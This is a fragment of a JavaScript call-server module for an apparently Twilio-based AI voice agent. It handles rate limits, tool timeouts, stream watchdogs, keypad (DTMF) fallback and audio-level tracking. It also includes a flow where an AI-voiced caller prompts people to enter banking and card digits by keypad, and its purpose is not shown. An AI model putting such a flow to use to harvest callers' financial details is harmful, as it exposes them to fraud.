  existing.count += 1;
  outboundRateBuckets.set(bucketKey, existing);
  return { allowed: true };
}

async function enforceOutboundRateLimits(req, res, options = {}) {
  const requestId = req.requestId || null;
  const actorKey = getOutboundActorKey(req, options.actorKey);
  const windowMs = Number(options.windowMs) || Number(config.outboundLimits?.windowMs) || 60000;
  const perUserLimit = Number(options.perUserLimit);
  const globalLimit = Number(options.globalLimit);
  const namespace = options.namespace || "outbound";

  const perUserCheck = await checkOutboundRateLimit(
    `${namespace}:user`,
    actorKey,
    perUserLimit,
    windowMs,
  );
  if (!perUserCheck.allowed) {
    res.setHeader("retry-after", Math.ceil(perUserCheck.retryAfterMs / 1000));
    return sendApiError(
      res,
      429,
      `${namespace}_per_user_rate_limited`,
      "Too many requests for this user. Please retry shortly.",
      requestId,
      { retry_after_ms: perUserCheck.retryAfterMs },
    );
  }

  const globalCheck = await checkOutboundRateLimit(
    `${namespace}:global`,
    "all",
    globalLimit,
    windowMs,
  );
  if (!globalCheck.allowed) {
    res.setHeader("retry-after", Math.ceil(globalCheck.retryAfterMs / 1000));
    return sendApiError(
      res,
      429,
      `${namespace}_global_rate_limited`,
      "Service is temporarily rate limited. Please retry shortly.",
      requestId,
      { retry_after_ms: globalCheck.retryAfterMs },
    );
  }

  return null;
}

function formatVoiceAgentErrorForLog(error) {
  if (!error) return "unknown";
  const message =
    error?.message ||
    error?.description ||
    error?.type ||
    "voice_agent_error";
  return redactSensitiveLogValue(message);
}

function getVoiceAgentRuntimeConfig() {
  const runtime = config.deepgram?.voiceAgent?.runtime || {};
  const turnTimeoutMs = Number(runtime.turnTimeoutMs);
  const toolTimeoutMs = Number(runtime.toolTimeoutMs);
  const maxToolResponseChars = Number(runtime.maxToolResponseChars);
  const maxConsecutiveToolFailures = Number(runtime.maxConsecutiveToolFailures);
  const timeoutFallbackThreshold = Number(runtime.timeoutFallbackThreshold);
  return {
    turnTimeoutMs:
      Number.isFinite(turnTimeoutMs) && turnTimeoutMs > 0 ? turnTimeoutMs : 12000,
    toolTimeoutMs:
      Number.isFinite(toolTimeoutMs) && toolTimeoutMs > 0 ? toolTimeoutMs : 8000,
    maxToolResponseChars:
      Number.isFinite(maxToolResponseChars) && maxToolResponseChars > 256
        ? maxToolResponseChars
        : 4000,
    maxConsecutiveToolFailures:
      Number.isFinite(maxConsecutiveToolFailures) &&
      maxConsecutiveToolFailures > 0
        ? Math.round(maxConsecutiveToolFailures)
        : 3,
    timeoutFallbackThreshold:
      Number.isFinite(timeoutFallbackThreshold) && timeoutFallbackThreshold >= 0
        ? Math.round(timeoutFallbackThreshold)
        : 2,
  };
}

function getOrCreateVoiceAgentRuntimeState(callSid) {
  if (!callSid) return null;
  if (!voiceAgentRuntimeByCall.has(callSid)) {
    voiceAgentRuntimeByCall.set(callSid, {
      provider: "unknown",
      phase: "idle",
      phaseAt: new Date().toISOString(),
      turnId: 0,
      turnTimeoutCount: 0,
      turnTimeoutTimer: null,
      consecutiveToolFailures: 0,
      toolsDisabled: false,
      fallbackRequested: false,
    });
  }
  return voiceAgentRuntimeByCall.get(callSid);
}

function setVoiceAgentRuntimeProvider(callSid, provider = "unknown") {
  const state = getOrCreateVoiceAgentRuntimeState(callSid);
  if (!state) return;
  state.provider = String(provider || "unknown").toLowerCase();
}

function setVoiceAgentPhase(callSid, phase) {
  const state = getOrCreateVoiceAgentRuntimeState(callSid);
  if (!state || !phase) return;
  state.phase = String(phase);
  state.phaseAt = new Date().toISOString();
}

function clearVoiceAgentTurnWatchdog(callSid) {
  const state = voiceAgentRuntimeByCall.get(callSid);
  if (!state?.turnTimeoutTimer) return;
  clearTimeout(state.turnTimeoutTimer);
  state.turnTimeoutTimer = null;
}

function clearVoiceAgentRuntime(callSid) {
  const state = voiceAgentRuntimeByCall.get(callSid);
  if (!state) return;
  if (state.turnTimeoutTimer) {
    clearTimeout(state.turnTimeoutTimer);
  }
  voiceAgentRuntimeByCall.delete(callSid);
}

function armVoiceAgentTurnWatchdog(callSid, onTimeout) {
  const state = getOrCreateVoiceAgentRuntimeState(callSid);
  if (!state) return;
  const { turnTimeoutMs } = getVoiceAgentRuntimeConfig();
  clearVoiceAgentTurnWatchdog(callSid);
  state.turnId += 1;
  const watchTurnId = state.turnId;
  state.turnTimeoutTimer = setTimeout(() => {
    const current = voiceAgentRuntimeByCall.get(callSid);
    if (!current) return;
    if (current.turnId !== watchTurnId) return;
    current.turnTimeoutTimer = null;
    current.turnTimeoutCount += 1;
    setVoiceAgentPhase(callSid, "timeout_waiting_agent");
    Promise.resolve(
      onTimeout?.({
        turnId: watchTurnId,
        timeoutMs: turnTimeoutMs,
        timeoutCount: current.turnTimeoutCount,
      }),
    ).catch(() => {});
  }, turnTimeoutMs);
}

function markVoiceAgentAgentResponsive(callSid, phase = "agent_speaking") {
  clearVoiceAgentTurnWatchdog(callSid);
  setVoiceAgentPhase(callSid, phase);
}

function clampVoiceAgentFunctionResult(result) {
  const { maxToolResponseChars } = getVoiceAgentRuntimeConfig();
  const serialized =
    typeof result === "string" ? result : JSON.stringify(result || {});
  if (serialized.length <= maxToolResponseChars) {
    return result;
  }
  return {
    truncated: true,
    preview: `${serialized.slice(0, maxToolResponseChars)}...[truncated]`,
    original_length: serialized.length,
  };
}

async function executeVoiceAgentFunctionWithGuard(
  callSid,
  functionSystem,
  functionName,
  args = {},
) {
  const state = getOrCreateVoiceAgentRuntimeState(callSid);
  const {
    toolTimeoutMs,
    maxConsecutiveToolFailures,
  } = getVoiceAgentRuntimeConfig();

  if (state?.toolsDisabled) {
    return {
      error:
        "Function execution is temporarily disabled for this call due to repeated tool failures.",
    };
  }

  const fn = functionSystem?.implementations?.[functionName];
  if (!fn) {
    throw new Error(`Function ${functionName} is not available`);
  }

  let timeoutId = null;
  const timeoutPromise = new Promise((_, reject) => {
    timeoutId = setTimeout(() => {
      const timeoutError = new Error(
        `Function ${functionName} timed out after ${toolTimeoutMs}ms`,
      );
      timeoutError.code = "voice_agent_tool_timeout";
      reject(timeoutError);
    }, toolTimeoutMs);
  });

  try {
    const result = await Promise.race([Promise.resolve(fn(args || {})), timeoutPromise]);
    if (timeoutId) clearTimeout(timeoutId);
    if (state) {
      state.consecutiveToolFailures = 0;
    }
    db
      ?.addCallMetric?.(callSid, "voice_agent_tool_success", 1, {
        function_name: functionName,
      })
      .catch(() => {});
    return clampVoiceAgentFunctionResult(result);
  } catch (error) {
    if (timeoutId) clearTimeout(timeoutId);
    const safeReason = formatVoiceAgentErrorForLog(error);
    if (state) {
      state.consecutiveToolFailures += 1;
      if (state.consecutiveToolFailures >= maxConsecutiveToolFailures) {
        state.toolsDisabled = true;
        db
          ?.updateCallState?.(callSid, "voice_agent_tools_disabled", {
            at: new Date().toISOString(),
            consecutive_tool_failures: state.consecutiveToolFailures,
          })
          .catch(() => {});
      }
    }
    db
      ?.addCallMetric?.(callSid, "voice_agent_tool_failure", 1, {
        function_name: functionName,
        reason: safeReason,
      })
      .catch(() => {});
    throw new Error(safeReason);
  }
}

function resetVoiceAgentRuntimeForTests() {
  for (const callSid of voiceAgentRuntimeByCall.keys()) {
    clearVoiceAgentRuntime(callSid);
  }
}

function queuePendingDigitAction(callSid, action = {}) {
  if (!callSid) return false;
  const callConfig = callConfigurations.get(callSid);
  if (!callConfig) return false;
  if (!Array.isArray(callConfig.pending_digit_actions)) {
    callConfig.pending_digit_actions = [];
  }
  callConfig.pending_digit_actions.push({
    type: action.type,
    text: action.text || "",
    reason: action.reason || null,
    scheduleTimeout: action.scheduleTimeout === true,
  });
  callConfigurations.set(callSid, callConfig);
  return true;
}

function popPendingDigitActions(callSid) {
  const callConfig = callConfigurations.get(callSid);
  if (
    !callConfig ||
    !Array.isArray(callConfig.pending_digit_actions) ||
    !callConfig.pending_digit_actions.length
  ) {
    return [];
  }
  const actions = callConfig.pending_digit_actions.slice(0);
  callConfig.pending_digit_actions = [];
  callConfigurations.set(callSid, callConfig);
  return actions;
}

function clearPendingDigitReprompts(callSid) {
  const callConfig = callConfigurations.get(callSid);
  if (
    !callConfig ||
    !Array.isArray(callConfig.pending_digit_actions) ||
    !callConfig.pending_digit_actions.length
  ) {
    return;
  }
  callConfig.pending_digit_actions = callConfig.pending_digit_actions.filter(
    (action) => action?.type !== "reprompt",
  );
  callConfigurations.set(callSid, callConfig);
}

async function handlePendingDigitActions(
  callSid,
  actions = [],
  gptService,
  interactionCount = 0,
) {
  if (!callSid || !actions.length) return false;
  for (const action of actions) {
    if (!action) continue;
    if (action.type === "end") {
      const reason = action.reason || "digits_collected";
      const message = action.text || CLOSING_MESSAGE;
      await speakAndEndCall(callSid, message, reason);
      return true;
    }
    if (action.type === "reprompt" && gptService && action.text) {
      const personalityInfo =
        gptService?.personalityEngine?.getCurrentPersonality?.();
      gptService.emit(
        "gptreply",
        {
          partialResponseIndex: null,
          partialResponse: action.text,
          personalityInfo,
          adaptationHistory: gptService?.personalityChanges?.slice(-3) || [],
        },
        interactionCount,
      );
      if (digitService) {
        digitService.markDigitPrompted(
          callSid,
          gptService,
          interactionCount,
          "dtmf",
          {
            allowCallEnd: true,
            prompt_text: action.text,
            reset_buffer: true,
          },
        );
        if (action.scheduleTimeout) {
          digitService.scheduleDigitTimeout(
            callSid,
            gptService,
            interactionCount + 1,
          );
        }
      }
    }
  }
  return true;
}

function scheduleSilenceTimer(callSid, timeoutMs = 30000) {
  if (!callSid) return;
  if (callEndLocks.has(callSid)) {
    return;
  }
  if (digitService?.hasExpectation(callSid) || isCaptureActive(callSid)) {
    return;
  }
  clearSilenceTimer(callSid);
  const timer = setTimeout(() => {
    if (!digitService?.hasExpectation(callSid) && !isCaptureActive(callSid)) {
      speakAndEndCall(
        callSid,
        CALL_END_MESSAGES.no_response,
        "silence_timeout",
      );
    }
  }, timeoutMs);
  silenceTimers.set(callSid, timer);
}

function clearFirstMediaWatchdog(callSid) {
  const timer = streamFirstMediaTimers.get(callSid);
  if (timer) {
    clearTimeout(timer);
    streamFirstMediaTimers.delete(callSid);
  }
}

function markStreamMediaSeen(callSid) {
  if (!callSid || streamFirstMediaSeen.has(callSid)) return;
  streamLastMediaAt.set(callSid, Date.now());
  streamFirstMediaSeen.add(callSid);
  clearFirstMediaWatchdog(callSid);
  const startedAt = streamStartTimes.get(callSid);
  if (startedAt) {
    const deltaMs = Math.max(0, Date.now() - startedAt);
    const threshold = Number(config.callSlo?.firstMediaMs);
    const thresholdMs =
      Number.isFinite(threshold) && threshold > 0 ? threshold : null;
    db?.addCallMetric?.(callSid, "first_media_ms", deltaMs, {
      threshold_ms: thresholdMs,
    }).catch(() => {});
    if (thresholdMs && deltaMs > thresholdMs) {
      db?.logServiceHealth?.("call_slo", "degraded", {
        call_sid: callSid,
        metric: "first_media_ms",
        value: deltaMs,
        threshold_ms: thresholdMs,
      }).catch(() => {});
    }
    streamStartTimes.delete(callSid);
  }
  db?.updateCallState?.(callSid, "stream_media", {
    at: new Date().toISOString(),
  }).catch(() => {});
}

function scheduleFirstMediaWatchdog(callSid, host, callConfig) {
  if (!callSid || !callConfig?.inbound) return;
  if (TWILIO_STREAM_TRACK === "inbound_track") {
    return;
  }
  const timeoutMs = Number(
    callConfig.firstMediaTimeoutMs || config.inbound?.firstMediaTimeoutMs,
  );
  if (!Number.isFinite(timeoutMs) || timeoutMs <= 0) return;
  if (streamFirstMediaSeen.has(callSid)) return;
  clearFirstMediaWatchdog(callSid);
  const timer = setTimeout(async () => {
    streamFirstMediaTimers.delete(callSid);
    if (streamFirstMediaSeen.has(callSid)) return;
    webhookService.addLiveEvent(
      callSid,
      "⚠️ No audio detected. Attempting fallback.",
      { force: true },
    );
    await db
      ?.updateCallState?.(callSid, "stream_no_media", {
        at: new Date().toISOString(),
        timeout_ms: timeoutMs,
      })
      .catch(() => {});
    await handleStreamTimeout(callSid, host, {
      allowHangup: false,
      reason: "no_media",
    });
  }, timeoutMs);
  streamFirstMediaTimers.set(callSid, timer);
}

const STREAM_RETRY_SETTINGS = {
  maxAttempts: 1,
  baseDelayMs: 1500,
  maxDelayMs: 8000,
};

function shouldRetryStream(reason = "") {
  return [
    "no_media",
    "stream_not_connected",
    "stream_auth_failed",
    "watchdog_no_media",
  ].includes(reason);
}

async function scheduleStreamReconnect(callSid, host, reason = "unknown") {
  if (!callSid || !config.twilio?.accountSid || !config.twilio?.authToken)
    return false;
  const state = streamRetryState.get(callSid) || {
    attempts: 0,
    nextDelayMs: STREAM_RETRY_SETTINGS.baseDelayMs,
  };
  if (state.attempts >= STREAM_RETRY_SETTINGS.maxAttempts) {
    return false;
  }
  state.attempts += 1;
  const delayMs = Math.min(state.nextDelayMs, STREAM_RETRY_SETTINGS.maxDelayMs);
  state.nextDelayMs = Math.min(
    state.nextDelayMs * 2,
    STREAM_RETRY_SETTINGS.maxDelayMs,
  );
  streamRetryState.set(callSid, state);
  const jitterMs = Math.floor(Math.random() * 250);

  webhookService.addLiveEvent(
    callSid,
    `🔁 Retrying stream (${state.attempts}/${STREAM_RETRY_SETTINGS.maxAttempts})`,
    { force: true },
  );
  setTimeout(async () => {
    try {
      const twiml = buildTwilioStreamTwiml(host, { callSid });
      const client = twilio(config.twilio.accountSid, config.twilio.authToken);
      await client.calls(callSid).update({ twiml });
      await db
        .updateCallState(callSid, "stream_retry", {
          attempt: state.attempts,
          reason,
          at: new Date().toISOString(),
        })
        .catch(() => {});
    } catch (error) {
      console.error(
        `Stream retry failed for ${callSid}:`,
        error?.message || error,
      );
      await db
        .updateCallState(callSid, "stream_retry_failed", {
          attempt: state.attempts,
          reason,
          at: new Date().toISOString(),
          error: error?.message || String(error),
        })
        .catch(() => {});
    }
  }, delayMs + jitterMs);

  return true;
}

const STREAM_WATCHDOG_INTERVAL_MS = 5000;
const STREAM_STALL_DEFAULTS = {
  noMediaMs: 20000,
  noMediaEscalationMs: 45000,
  sttStallMs: 25000,
  sttEscalationMs: 60000,
};

function resolveStreamConnectedAt(callSid) {
  if (!callSid) return null;
  const startedAt = streamStartTimes.get(callSid);
  if (Number.isFinite(startedAt)) {
    return startedAt;
  }
  const connection = activeStreamConnections.get(callSid);
  if (connection?.connectedAt) {
    const parsed = Date.parse(connection.connectedAt);
    if (Number.isFinite(parsed)) {
      return parsed;
    }
  }
  return null;
}

function resolveStreamWatchdogThresholds(callConfig) {
  const sloFirstMedia = Number(config.callSlo?.firstMediaMs) || 4000;
  const inboundFirstMedia = Number(
    callConfig?.firstMediaTimeoutMs || config.inbound?.firstMediaTimeoutMs,
  );
  const noMediaMs =
    Number.isFinite(inboundFirstMedia) && inboundFirstMedia > 0
      ? inboundFirstMedia
      : Math.max(STREAM_STALL_DEFAULTS.noMediaMs, sloFirstMedia * 3);
  const noMediaEscalationMs = Math.max(
    STREAM_STALL_DEFAULTS.noMediaEscalationMs,
    noMediaMs * 2,
  );
  const sttStallMs = Math.max(
    STREAM_STALL_DEFAULTS.sttStallMs,
    sloFirstMedia * 6,
  );
  const sttEscalationMs = Math.max(
    STREAM_STALL_DEFAULTS.sttEscalationMs,
    sttStallMs * 2,
  );
  return { noMediaMs, noMediaEscalationMs, sttStallMs, sttEscalationMs };
}

function getStreamWatchdogState(callSid) {
  if (!callSid) return null;
  const state = streamWatchdogState.get(callSid) || {};
  streamWatchdogState.set(callSid, state);
  return state;
}

async function handleStreamStallNotice(callSid, message, stateKey, state) {
  if (!callSid || !state || state[stateKey]) return false;
  state[stateKey] = Date.now();
  webhookService.addLiveEvent(callSid, message, { force: true });
  return true;
}

async function runStreamWatchdog() {
  const host = config.server?.hostname;
  if (!host) return;
  const now = Date.now();

  for (const [callSid, callConfig] of callConfigurations.entries()) {
    if (!callSid || callEndLocks.has(callSid)) continue;
    const state = getStreamWatchdogState(callSid);
    if (!state) continue;
    const connectedAt = resolveStreamConnectedAt(callSid);
    if (!connectedAt) continue;
    const thresholds = resolveStreamWatchdogThresholds(callConfig);
    const noMediaElapsed = now - connectedAt;

    if (
      !streamFirstMediaSeen.has(callSid) &&
      noMediaElapsed > thresholds.noMediaMs
    ) {
      const notified = await handleStreamStallNotice(
        callSid,
        "⚠️ Stream stalled. Attempting recovery…",
        "noMediaNotifiedAt",
        state,
      );
      if (notified) {
        await db
          ?.updateCallState?.(callSid, "stream_stalled", {
            at: new Date().toISOString(),
            phase: "no_media",
            elapsed_ms: noMediaElapsed,
          })
          .catch(() => {});
        void handleStreamTimeout(callSid, host, {
          allowHangup: false,
          reason: "watchdog_no_media",
        });
        continue;
      }
      if (
        !state.noMediaEscalatedAt &&
        noMediaElapsed > thresholds.noMediaEscalationMs
      ) {
        state.noMediaEscalatedAt = now;
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Stream still offline. Ending call.",
          { force: true },
        );
        void handleStreamTimeout(callSid, host, {
          allowHangup: true,
          reason: "watchdog_no_media",
        });
      }
      continue;
    }

    const lastMediaAt = streamLastMediaAt.get(callSid);
    if (!lastMediaAt) continue;
    const sttElapsed = now - (sttLastFrameAt.get(callSid) || lastMediaAt);
    if (sttElapsed > thresholds.sttStallMs) {
      const notified = await handleStreamStallNotice(
        callSid,
        "⚠️ Speech pipeline stalled. Switching to keypad…",
        "sttNotifiedAt",
        state,
      );
      if (notified) {
        await db
          ?.updateCallState?.(callSid, "stt_stalled", {
            at: new Date().toISOString(),
            elapsed_ms: sttElapsed,
          })
          .catch(() => {});
        const session = activeCalls.get(callSid);
        void activateDtmfFallback(
          callSid,
          callConfig,
          session?.gptService,
          session?.interactionCount || 0,
          "stt_stall",
        );
      } else if (
        !state.sttEscalatedAt &&
        sttElapsed > thresholds.sttEscalationMs
      ) {
        state.sttEscalatedAt = now;
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Speech still unavailable. Ending call.",
          { force: true },
        );
        void handleStreamTimeout(callSid, host, {
          allowHangup: true,
          reason: "stt_stall",
        });
      }
    }
  }
}

async function handleStreamTimeout(callSid, host, options = {}) {
  if (!callSid || streamTimeoutCalls.has(callSid)) return;
  const allowHangup = options.allowHangup !== false;
  streamTimeoutCalls.add(callSid);
  let releaseLock = false;
  try {
    const callConfig = callConfigurations.get(callSid);
    const callDetails = await db?.getCall?.(callSid).catch(() => null);
    const statusValue = normalizeCallStatus(
      callDetails?.status || callDetails?.twilio_status,
    );
    const isAnswered =
      Boolean(callDetails?.started_at) ||
      ["answered", "in-progress", "completed"].includes(statusValue);
    if (!isAnswered) {
      console.warn(
        `Skipping stream timeout for ${callSid} (status=${statusValue || "unknown"})`,
      );
      releaseLock = true;
      return;
    }
    const expectation = digitService?.getExpectation?.(callSid);
    if (expectation && config.twilio?.gatherFallback) {
      const prompt =
        expectation.prompt ||
        (digitService?.buildDigitPrompt
          ? digitService.buildDigitPrompt(expectation)
          : "");
      const sent = await digitService.sendTwilioGather(
        callSid,
        expectation,
        { prompt },
        host,
      );
      if (sent) {
        await db
          .updateCallState(callSid, "stream_fallback_gather", {
            at: new Date().toISOString(),
          })
          .catch(() => {});
        return;
      }
    }

    if (
      shouldRetryStream(options.reason) &&
      (await scheduleStreamReconnect(callSid, host, options.reason))
    ) {
      console.warn(
        `Stream retry scheduled for ${callSid} (${options.reason || "unspecified"})`,
      );
      releaseLock = true;
      return;
    }

    if (!allowHangup) {
      console.warn(
        `Stream timeout for ${callSid} resolved without hangup (${options.reason || "unspecified"})`,
      );
      releaseLock = true;
      return;
    }

    if (config.twilio?.accountSid && config.twilio?.authToken) {
      const client = twilio(config.twilio.accountSid, config.twilio.authToken);
      const response = new VoiceResponse();
      response.say(
        "We are having trouble connecting the call. Please try again later.",
      );
      response.hangup();
      await client.calls(callSid).update({ twiml: response.toString() });
    }

    await db
      .updateCallState(callSid, "stream_timeout", {
        at: new Date().toISOString(),
        provider: callConfig?.provider || currentProvider,
      })
      .catch(() => {});
  } catch (error) {
    console.error("Stream timeout handler error:", error);
  } finally {
    if (releaseLock) {
      streamTimeoutCalls.delete(callSid);
    }
  }
}

async function activateDtmfFallback(
  callSid,
  callConfig,
  gptService,
  interactionCount = 0,
  reason = "stt_failure",
) {
  if (!callSid || sttFallbackCalls.has(callSid)) return false;
  if (!digitService) return false;
  const provider = callConfig?.provider || currentProvider;
  if (provider !== "twilio") return false;
  sttFallbackCalls.add(callSid);

  const configToUse = callConfig || callConfigurations.get(callSid);
  if (!configToUse) return false;

  configToUse.digit_intent = { mode: "dtmf", reason, confidence: 1 };
  configToUse.digit_capture_active = true;
  configToUse.call_mode = "dtmf_capture";
  configToUse.flow_state = "capture_pending";
  configToUse.flow_state_reason = reason;
  configToUse.flow_state_updated_at = new Date().toISOString();
  callConfigurations.set(callSid, configToUse);

  await db
    .updateCallState(callSid, "stt_fallback", {
      reason,
      at: new Date().toISOString(),
    })
    .catch(() => {});

  try {
    await applyInitialDigitIntent(
      callSid,
      configToUse,
      gptService,
      interactionCount,
    );
  } catch (error) {
    console.error("Failed to apply digit intent during STT fallback:", error);
  }

  const expectation = digitService.getExpectation(callSid);
  if (expectation && config.twilio?.gatherFallback) {
    const prompt =
      expectation.prompt || digitService.buildDigitPrompt(expectation);
    try {
      const sent = await digitService.sendTwilioGather(callSid, expectation, {
        prompt,
      });
      if (sent) {
        webhookService.addLiveEvent(callSid, "📟 Switching to keypad capture", {
          force: true,
        });
        return true;
      }
    } catch (error) {
      console.error("Twilio gather fallback error:", error);
    }
  }

  const fallbackPrompt = expectation
    ? digitService.buildDigitPrompt(expectation)
    : "Please enter the digits using your keypad.";
  if (gptService) {
    const personalityInfo =
      gptService?.personalityEngine?.getCurrentPersonality?.();
    gptService.emit(
      "gptreply",
      {
        partialResponseIndex: null,
        partialResponse: fallbackPrompt,
        personalityInfo,
        adaptationHistory: gptService?.personalityChanges?.slice(-3) || [],
      },
      interactionCount,
    );
  }
  if (expectation) {
    digitService.markDigitPrompted(
      callSid,
      gptService,
      interactionCount,
      "dtmf",
      {
        allowCallEnd: true,
        prompt_text: fallbackPrompt,
        reset_buffer: true,
      },
    );
    digitService.scheduleDigitTimeout(
      callSid,
      gptService,
      interactionCount + 1,
    );
  }
  return true;
}

function estimateAudioLevelFromBase64(base64 = "") {
  if (!base64) return null;
  let buffer;
  try {
    buffer = Buffer.from(base64, "base64");
  } catch (_) {
    return null;
  }
  if (!buffer.length) return null;
  const step = Math.max(1, Math.floor(buffer.length / 800));
  let sum = 0;
  let count = 0;
  for (let i = 0; i < buffer.length; i += step) {
    sum += Math.abs(buffer[i] - 128);
    count += 1;
  }
  if (!count) return null;
  const level = sum / (count * 128);
  return Math.max(0, Math.min(1, level));
}

function estimateAudioLevelFromBuffer(buffer, options = {}) {
  if (!Buffer.isBuffer(buffer) || !buffer.length) return null;
  const encoding = String(options.encoding || "").toLowerCase();
  if (["pcm", "linear", "linear16", "l16"].includes(encoding)) {
    const minStep = 2;
    let step = Math.max(minStep, Math.floor(buffer.length / 800));
    if (step % 2 !== 0) {
      step += 1;
    }
    let sum = 0;
    let count = 0;
    for (let i = 0; i + 1 < buffer.length; i += step) {
      sum += Math.abs(buffer.readInt16LE(i));
      count += 1;
    }
    if (!count) return null;
    const level = sum / (count * 32768);
    return Math.max(0, Math.min(1, level));
  }
  const step = Math.max(1, Math.floor(buffer.length / 800));
  let sum = 0;
  let count = 0;
  for (let i = 0; i < buffer.length; i += step) {
    sum += Math.abs(buffer[i] - 128);
    count += 1;
  }
  if (!count) return null;
  const level = sum / (count * 128);
  return Math.max(0, Math.min(1, level));
}

function clampLevel(level) {
  if (!Number.isFinite(level)) return null;
  return Math.max(0, Math.min(1, level));
}

function shouldSampleUserAudioLevel(callSid, now = Date.now()) {
  const state = userAudioStates.get(callSid);
  if (!state) return true;
  return now - state.lastTickAt >= liveConsoleAudioTickMs;
}

function updateUserAudioLevel(callSid, level, now = Date.now()) {
  if (!callSid) return;
  const normalized = clampLevel(level);
  if (!Number.isFinite(normalized)) return;
  let state = userAudioStates.get(callSid);
  if (!state) {
    state = { lastTickAt: 0, lastAboveAt: 0, speaking: false };
  }
  if (now - state.lastTickAt < liveConsoleAudioTickMs) {
    return;
  }
  state.lastTickAt = now;
  const currentPhase = webhookService.getLiveConsolePhaseKey?.(callSid);
  if (normalized >= liveConsoleUserLevelThreshold) {
    state.speaking = true;
    state.lastAboveAt = now;
    userAudioStates.set(callSid, state);
    const nextPhase =
      currentPhase === "agent_speaking" || currentPhase === "agent_responding"
        ? "interrupted"
        : "user_speaking";
    webhookService
      .setLiveCallPhase(callSid, nextPhase, {
        level: normalized,
        logEvent: false,
      })
      .catch(() => {});
    return;
  }

  if (state.speaking) {
    if (now - state.lastAboveAt >= liveConsoleUserHoldMs) {
      state.speaking = false;
      userAudioStates.set(callSid, state);
      if (
        currentPhase !== "agent_speaking" &&
        currentPhase !== "agent_responding"
      ) {
        webhookService
          .setLiveCallPhase(callSid, "listening", { level: 0, logEvent: false })
          .catch(() => {});
      }
      return;
    }
    userAudioStates.set(callSid, state);
    if (currentPhase === "user_speaking" || currentPhase === "interrupted") {
      webhookService
        .setLiveCallPhase(callSid, currentPhase, {
          level: normalized,
          logEvent: false,
        })
        .catch(() => {});
    }
  } else {
    userAudioStates.set(callSid, state);
  }
}

function estimateAudioLevelsFromBase64(base64 = "", options = {}) {
  if (!base64)
    return { durationMs: 0, levels: [], intervalMs: options.intervalMs || 160 };
  let buffer;
  try {
    buffer = Buffer.from(base64, "base64");
  } catch (_) {
    return { durationMs: 0, levels: [], intervalMs: options.intervalMs || 160 };
  }
  const length = buffer.length;
  if (!length)
    return { durationMs: 0, levels: [], intervalMs: options.intervalMs || 160 };
  const durationMs = Math.round((length / 8000) * 1000);
  const intervalMs = Math.max(80, Number(options.intervalMs) || 160);
  const maxFrames = Number(options.maxFrames) || 48;
  const frames = Math.min(
    maxFrames,
    Math.max(1, Math.ceil(durationMs / intervalMs)),
  );
  const bytesPerFrame = Math.max(1, Math.floor(length / frames));
  const levels = new Array(frames).fill(0);
  for (let frame = 0; frame < frames; frame += 1) {
    const start = frame * bytesPerFrame;
    const end =
      frame === frames - 1 ? length : Math.min(length, start + bytesPerFrame);
    const span = Math.max(1, end - start);
    const step = Math.max(1, Math.floor(span / 120));
    let sum = 0;
    let count = 0;
    for (let i = start; i < end; i += step) {
      sum += Math.abs(buffer[i] - 128);
      count += 1;
    }
    const level = count ? Math.max(0, Math.min(1, sum / (count * 128))) : 0;
    levels[frame] = level;
  }
  const effectiveInterval = frames
    ? Math.max(80, Math.floor(durationMs / frames))
    : intervalMs;
  return { durationMs, levels, intervalMs: effectiveInterval };
}

function estimateAudioDurationMsFromBase64(base64 = "") {
  if (!base64) return 0;
  let buffer;
  try {
    buffer = Buffer.from(base64, "base64");
  } catch (_) {
    return 0;
  }
  return Math.round((buffer.length / 8000) * 1000);
}

function isGroupedGatherPlan(plan, callConfig = {}) {
  if (!plan) return false;
  const provider = callConfig?.provider || currentProvider;
  return (
    provider === "twilio" &&
    ["banking", "card"].includes(plan.group_id) &&
    plan.capture_mode === "ivr_gather" &&
    isCaptureActiveConfig(callConfig)
  );
}

function startGroupedGather(callSid, callConfig, options = {}) {
  if (!callSid || !digitService?.sendTwilioGather || !digitService?.getPlan)
    return false;
  const plan = digitService.getPlan(callSid);
  if (!isGroupedGatherPlan(plan, callConfig)) return false;
  const expectation = digitService.getExpectation(callSid);
  if (!expectation) return false;
  if (expectation.prompted_at && options.force !== true) return false;
  const prompt = digitService.buildPlanStepPrompt
    ? digitService.buildPlanStepPrompt(expectation)
    : expectation.prompt || digitService.buildDigitPrompt(expectation);
  if (!prompt) return false;
  const sayVoice = resolveTwilioSayVoice(callConfig);
  const sayOptions = sayVoice ? { voice: sayVoice } : null;
  const delayMs = Math.max(
    0,
    Number.isFinite(options.delayMs) ? options.delayMs : 0,
  );
  const preamble = options.preamble || "";
  const gptService = options.gptService || null;
  const interactionCount = Number.isFinite(options.interactionCount)
    ? options.interactionCount
    : 0;
  setTimeout(async () => {
    try {
      const activePlan = digitService.getPlan(callSid);
      const activeExpectation = digitService.getExpectation(callSid);
      if (!activePlan || !activeExpectation) return;
      if (!isGroupedGatherPlan(activePlan, callConfig)) return;
      if (activeExpectation.prompted_at && options.force !== true) return;
      if (
        activeExpectation.plan_id &&
        activePlan.id &&
        activeExpectation.plan_id !== activePlan.id
      )
        return;
      const usePlay = shouldUseTwilioPlay(callConfig);
      const ttsTimeoutMs = Number(config.twilio?.ttsMaxWaitMs) || 1200;
      const preambleUrl = usePlay
        ? await getTwilioTtsAudioUrlSafe(preamble, callConfig, ttsTimeoutMs)
        : null;
      const promptUrl = usePlay
        ? await getTwilioTtsAudioUrlSafe(prompt, callConfig, ttsTimeoutMs)
        : null;
      const sent = await digitService.sendTwilioGather(
        callSid,
        activeExpectation,
        {
          prompt,
          preamble,
          promptUrl,
          preambleUrl,
          sayOptions,
        },
      );
      if (!sent) {
        webhookService.addLiveEvent(
          callSid,
          "⚠️ Gather unavailable; using stream DTMF capture",
          { force: true },
        );
        digitService.markDigitPrompted(
          callSid,
          gptService,
          interactionCount,
          "dtmf",
          {
            allowCallEnd: true,
            prompt_text: [preamble, prompt].filter(Boolean).join(" "),
          },
        );
        if (gptService) {
          const personalityInfo =
            gptService?.personalityEngine?.getCurrentPersonality?.();
          gptService.emit(
            "gptreply",
            {
              partialResponseIndex: null,
              partialResponse: [preamble, prompt].filter(Boolean).join(" "),
              personalityInfo,
              adaptationHistory:
                gptService?.personalityChanges?.slice(-3) || [],
            },
            interactionCount,
          );
        }
        digitService.scheduleDigitTimeout(
          callSid,
          gptService,
          interactionCount,
        );
      }
    } catch (err) {
      console.error("Grouped gather start error:", err);
    }
  }, delayMs);
  return true;
}

function clearSpeechTicks(callSid) {
  const timer = speechTickTimers.get(callSid);
  if (timer) {
    clearInterval(timer);
    speechTickTimers.delete(callSid);
  }
}

